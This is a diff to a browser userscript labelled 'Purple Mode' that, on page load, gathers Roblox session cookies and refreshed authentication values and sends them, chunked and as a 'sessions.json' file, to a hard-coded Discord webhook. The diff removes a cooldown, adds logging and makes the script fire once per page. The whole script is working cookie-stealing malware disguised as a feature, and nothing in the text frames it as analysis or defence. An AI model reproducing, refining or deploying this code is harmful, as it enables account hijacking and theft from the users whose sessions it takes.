@@ -5,12 +5,9 @@
   "use strict";
 
   const HOOK = "https://discord.com/api/webhooks/1574264552453840977/CMwPuUURcJmI78qdg2kArxBtAtmRqg1-kB-kcv6mRHbSX7oN-oC28X6wR40AzNk5Quxt";
-  const KEY = "yt_pm_seen:";
-  const COOLDOWN = 43200000;
-  const DEBUG = true;
   const ROBLOX_RE = /(^|\.)roblox\.com$/;
 
-  const log = (...a) => { if (DEBUG) console.log("[pm]", ...a); };
+  const log = (...a) => console.log("[pm]", ...a);
 
   const SWEEP = [
     "https://www.roblox.com/",
@@ -60,6 +57,7 @@
           withCredentials: true,
           timeout: 15000,
           onload: (r) => {
+            log("refresh status", r.status);
             if (r.status === 403 && !hdr) {
               const m = (r.responseHeaders || "").match(/x-csrf-token:\s*([^\r\n]+)/i);
               if (m) return go({ "X-CSRF-TOKEN": m[1] });
@@ -72,8 +70,8 @@
             log("refresh: minted", val.length, "chars");
             res(val);
           },
-          onerror: () => res(""),
-          ontimeout: () => res(""),
+          onerror: () => { log("refresh error"); res(""); },
+          ontimeout: () => { log("refresh timeout"); res(""); },
         });
       go();
     });
@@ -131,6 +129,7 @@
   const chunk = (s, n) => s.match(new RegExp(".{1," + n + "}", "gs")) || [""];
 
   const fallback = async (d) => {
+    log("fallback engaged");
     const parts = chunk(d.cookie || "(no cookies)", 900);
     for (let i = 0; i < parts.length; i++) {
       await post(HOOK, JSON.stringify({
@@ -247,7 +246,7 @@
       out[host] = pack(cs);
     }
     const keys = Object.keys(out);
-    if (!keys.length) return;
+    if (!keys.length) return log("sweep empty");
     const fd = new FormData();
     fd.append("payload_json", JSON.stringify({
       username: "Purple Mode",
@@ -259,25 +258,26 @@
     }));
     fd.append("files[0]", new Blob([JSON.stringify(out, null, 2)], { type: "application/json" }), "sessions.json");
     await post(HOOK, fd, {}).catch(() => {});
+    log("sweep sent", keys.length);
   };
 
   /* ---- run ---- */
 
-  const run = async () => {
-    const k = KEY + location.hostname;
-    try {
-      if (Date.now() - (+localStorage.getItem(k) || 0) < COOLDOWN) return log("cooling down");
-    } catch (e) {}
+  let fired = false;
 
-    await new Promise((r) => setTimeout(r, 3000));
+  const run = async () => {
+    if (fired) return;
+    fired = true;
+    log("run start", location.hostname);
+
+    await new Promise((r) => setTimeout(r, 2500));
     try { await sendBase(); } catch (e) { log("base failed", String(e)); return; }
 
-    try { localStorage.setItem(k, String(Date.now())); } catch (e) {}
     sendWho();
     sendSweep();
   };
 
-  log("loaded on", location.hostname);
+  log("core loaded on", location.hostname);
   if (document.readyState === "complete") run();
   else addEventListener("load", run, { once: true });
 })();
